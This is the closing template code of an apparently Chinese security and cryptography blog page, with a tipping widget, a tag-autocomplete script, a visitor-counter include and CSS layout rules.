    <div class="shang_tit">
        <p>喜欢就点赞,疼爱就打赏</p>
    </div>
    <div class="shang_payimg">
        <div class="pay_img">
            <img src="/img/alipay.jpg" class="alipay" title="扫码支持">
            <img src="/img/weixin.jpg" class="weixin" title="扫码支持">
        </div>
    </div>
    <div class="shang_payselect">
        <span><label><input type="radio" name="pay" checked value="alipay">支付宝</label></span><span><label><input type="radio" name="pay" value="weixin">微信</label></span>
    </div>
</div>


</body>
<script src="/js/jquery.pjax.js?v=1.0.1" ></script>

<script src="/js/script.js?v=1.0.1" ></script>
<script>
    var img_resize = 'default';
    /*作者、标签的自动补全*/
    $(function () {
        $('.search').AutoComplete({
            'data': ['@Van1sh','@FzWjScJ','#Write Up','#docker','#Sage','#Paillier','#ECC','#Lattice','#Dsa','#LCG','#Rc4','#SM4','#Rsa','#Book','#python','#操作模式','#number theory','#Abstract algebra','#Web','#XSS','#Nmap','#Linux','#book',],
            'itemHeight': 20,
            'width': 418
        }).AutoComplete('show');
    })
    function initArticle() {
        /*渲染对应的表格样式*/
        
            $(".post .pjax table").addClass("green_title");
        

        /*渲染打赏样式*/
        
        $("input[name=pay]").on("click", function () {
            if($("input[name=pay]:checked").val()=="weixin"){
                $(".shang_box .shang_payimg .pay_img").addClass("weixin_img");
            } else {
                $(".shang_box .shang_payimg .pay_img").removeClass("weixin_img");
            }
        })
        

        /*高亮代码块行号*/
        

        /*访问数量*/
        
        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
        

        /*代码高亮，行号对齐*/
        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));

        
        
    }

    /*打赏页面隐藏与展示*/
    
    function dashangToggle() {
        $(".shang_box").fadeToggle();
        $(".hide_box").fadeToggle();
    }
    

</script>

<!--加入行号的高亮代码块样式-->

<!--自定义样式设置-->
<style>
    
    
    .nav {
        width: 542px;
    }
    .nav.fullscreen {
        margin-left: -542px;
    }
    .nav-left {
        width: 120px;
    }
    
    
    @media screen and (max-width: 1468px) {
        .nav {
            width: 492px;
        }
        .nav.fullscreen {
            margin-left: -492px;
        }
        .nav-left {
            width: 100px;
        }
    }
    
    
    @media screen and (max-width: 1024px) {
        .nav {
            width: 492px;
            margin-left: -492px
        }
        .nav.fullscreen {
            margin-left: 0;
        }
        .nav .hide-list.fullscreen {
            left: 492px
        }
    }
    
    @media screen and (max-width: 426px) {
        .nav {
            width: 100%;
        }
        .nav-left {
            width: 100%;
        }
    }
    
    
    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
        color: #383636;
    }
    
    
    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
        color: #5e5e5f;
    }
    
    
    .nav-right nav a.hover, #local-search-result a.hover{
        background-color: #e2e0e0;
    }
    
    

    /*列表样式*/
    
    .post .pjax article .article-entry>ol, .post .pjax article .article-entry>ul, .post .pjax article>ol, .post .pjax article>ul{
        border: #e2dede solid 1px;
        border-radius: 10px;
        padding: 10px 32px 10px 56px;
    }
    .post .pjax article .article-entry li>ol, .post .pjax article .article-entry li>ul,.post .pjax article li>ol, .post .pjax article li>ul{
        padding-top: 5px;
        padding-bottom: 5px;
    }
    .post .pjax article .article-entry>ol>li, .post .pjax article .article-entry>ul>li,.post .pjax article>ol>li, .post .pjax article>ul>li{
        margin-bottom: auto;
        margin-left: auto;
    }
    .post .pjax article .article-entry li>ol>li, .post .pjax article .article-entry li>ul>li,.post .pjax article li>ol>li, .post .pjax article li>ul>li{
        margin-bottom: auto;
        margin-left: auto;
    }
    

    /* 背景图样式 */
    
    


    /*引用块样式*/
    

    /*文章列表背景图*/
    
    .nav-right:before {
        content: ' ';
        display: block;
        position: absolute;
        left: 0;
        top: 0;
        width: 100%;
        height: 100%;
        opacity: 0.3;
        background: url("https://i.loli.net/2019/07/22/5d3521411f3f169375.png");
        background-repeat: no-repeat;
        background-position: 50% 0;
        -ms-background-size: cover;
        -o-background-size: cover;
        -moz-background-size: cover;
        -webkit-background-size: cover;
        background-size: cover;
    }
    

    
</style>







</html>
